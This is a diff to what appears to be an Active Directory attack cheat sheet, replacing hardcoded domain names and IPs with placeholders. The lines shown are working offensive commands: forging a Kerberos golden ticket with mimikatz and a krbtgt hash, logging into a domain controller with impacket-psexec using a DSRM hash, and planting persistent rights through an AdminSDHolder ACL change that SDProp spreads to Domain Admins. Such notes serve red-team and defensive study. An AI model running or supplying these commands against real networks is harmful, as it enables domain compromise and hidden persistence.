@@ -26,7 +26,7 @@ NTLM : 1693c6cefafffc7af11ef34d1c788f47
 ### Forge a Golden Ticket
 
 ```powershell
-mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+mimikatz # kerberos::golden /user:jen /domain:$DOMAIN /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 ```
 
 ### Verify and Use
@@ -98,17 +98,17 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t
 ### Use it
 
 ```bash
-impacket-psexec -hashes :<DSRM-NTLM> DC01/Administrator@10.10.10.10
+impacket-psexec -hashes :<DSRM-NTLM> DC01/Administrator@$DC_IP
 ```
 
 ---
 
 ## AdminSDHolder
 
-The ACL on `CN=AdminSDHolder,CN=System,DC=example,DC=com` is copied to all protected accounts (adminCount=1) every 60 minutes by the SDProp process. Modifying AdminSDHolder's ACL creates persistent rights on Domain Admins and every other protected account.
+The ACL on `CN=AdminSDHolder,CN=System,$BASE_DN` is copied to all protected accounts (adminCount=1) every 60 minutes by the SDProp process. Modifying AdminSDHolder's ACL creates persistent rights on Domain Admins and every other protected account.
 
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=example,DC=com' -PrincipalIdentity <attacker> -Rights All
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$BASE_DN' -PrincipalIdentity <attacker> -Rights All
 ```
 
 Wait up to 60 minutes, then re-check Domain Admin ACLs, your rights will have propagated.
